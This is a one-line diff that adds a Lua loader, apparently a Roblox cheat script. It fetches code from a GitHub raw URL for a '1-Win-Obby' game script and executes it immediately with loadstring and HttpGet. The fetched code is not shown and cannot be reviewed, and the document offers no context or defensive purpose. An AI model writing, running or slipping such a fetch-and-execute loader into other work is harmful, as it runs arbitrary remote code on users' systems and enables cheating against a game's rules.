@@ -1,0 +1,1 @@
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/AllFilmOffical/1-Win-Obby-Script/main/Cash"))() 
